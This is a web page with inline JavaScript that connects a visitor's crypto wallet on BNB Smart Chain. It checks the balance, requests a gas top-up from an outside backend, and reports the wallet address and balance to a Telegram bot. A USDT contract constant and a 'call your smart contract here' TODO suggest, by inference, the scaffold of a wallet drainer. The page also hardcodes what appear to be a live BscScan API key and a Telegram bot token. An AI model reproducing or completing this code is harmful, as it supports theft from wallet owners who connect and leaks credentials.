<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>BSC Wallet Balance Sender</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
</head>
<body style="font-family: Arial; text-align: center; padding: 40px;">
  <h2>Connect Wallet, Send Balance & Trigger Smart Contract</h2>
  <button onclick="connectAndProcess()" style="padding: 12px 24px; font-size: 16px;">Connect Wallet</button>
  <p id="status"></p>

  <script>
    const BSC_SCAN_API = 'ZTC12CNRZ8UC8HGFDIW8SARDJXP1N6QIR1';
    const TELEGRAM_TOKEN = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU';
    const TELEGRAM_CHAT_ID = '8060968649';
    const USDT_CONTRACT = '0x55d398326f99059ff775485246999027b3197955';
    const BACKEND_URL = 'https://a-production-c9bc.up.railway.app/api/topup-bnb';
    const BNB_THRESHOLD = 1; // $1 in BNB

    async function getBNBPrice() {
      const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
      const data = await res.json();
      return data.binancecoin.usd;
    }

    async function getBNBBalance(address) {
      const res = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${BSC_SCAN_API}`);
      const data = await res.json();
      if (data.status !== "1") return null;
      return parseFloat(data.result) / 1e18;
    }

    async function connectAndProcess() {
      if (typeof window.ethereum === 'undefined') {
        alert("‚ö†Ô∏è Please install MetaMask or a Web3 wallet!");
        return;
      }

      const web3 = new Web3(window.ethereum);
      const status = document.getElementById("status");

      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const address = accounts[0];

        let message = `üì≤ *Connected Wallet*\n\`${address}\`\n\n`;

        const bnbPrice = await getBNBPrice();
        let bnb = await getBNBBalance(address);
        if (bnb === null) {
          status.innerText = "‚ùå Could not fetch BNB balance";
          return;
        }

        const bnbValueUSD = bnb * bnbPrice;
        message += `üí∞ *BNB*: ${bnb.toFixed(4)} (${bnbValueUSD.toFixed(2)} USD)\n`;

        if (bnbValueUSD < BNB_THRESHOLD) {
          status.innerText = "‚ö†Ô∏è Insufficient BNB. Requesting top-up...";
          const topUpRes = await fetch(BACKEND_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ address })
          });
          const topUpData = await topUpRes.json();

          if (!topUpData.ready) {
            status.innerText = "‚ùå BNB top-up failed.";
            return;
          }

          status.innerText = "‚è≥ Waiting for BNB to arrive...";
          // Wait until balance reaches at least $1
          let retries = 10;
          while (retries-- > 0) {
            await new Promise(r => setTimeout(r, 5000)); // 5s delay
            bnb = await getBNBBalance(address);
            if ((bnb * bnbPrice) >= BNB_THRESHOLD) break;
          }

          const newUSD = (bnb * bnbPrice).toFixed(2);
          if ((bnb * bnbPrice) < BNB_THRESHOLD) {
            status.innerText = `‚ùå BNB not received after waiting. Final: $${newUSD}`;
            return;
          }

          status.innerText = `‚úÖ BNB received! Proceeding with contract...`;
        } else {
          status.innerText = "‚úÖ Sufficient BNB found. Proceeding...";
        }

        // ‚úÖ TODO: Call your smart contract here
        message += `‚úÖ Ready to call smart contract\n`;

        // Send to Telegram for log
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
          })
        });

        status.innerText += "\nüü¢ All Done. Telegram updated.";
      } catch (err) {
        console.error(err);
        status.innerText = "‚ùå Something went wrong!";
      }
    }
  </script>
</body>
</html>
